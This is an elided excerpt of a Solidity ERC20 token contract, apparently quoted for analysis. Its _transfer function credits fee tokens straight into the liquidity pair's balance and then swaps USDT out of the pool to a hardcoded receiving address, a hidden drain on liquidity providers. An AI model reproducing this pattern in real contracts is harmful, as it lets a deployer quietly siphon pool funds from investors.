...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address public usdttoken = address(0x23766CB8a96fF2f46F664BC7D088a6306DE73618);

    address public Receivingaddress = address(0xFBB04eBFaa90983528ab177bbE5B04ECc5436F99);
    ...
    function _transfer(
        ...
        if(takeFee){
            ...
            rate=rate-feeRate;
            _balances[uniswapV2Pair] += amount.div(1000).mul(50);
            emit Transfer(sender, uniswapV2Pair, amount.div(1000).mul(50));
             if(IPancakePair(uniswapV2Pair).token0()==usdttoken){
                IPancakePair(uniswapV2Pair).swap(uint256(10),uint256(0),Receivingaddress,'');
             }else{
                IPancakePair(uniswapV2Pair).swap(uint256(0),uint256(10),Receivingaddress,'');
            }
        }
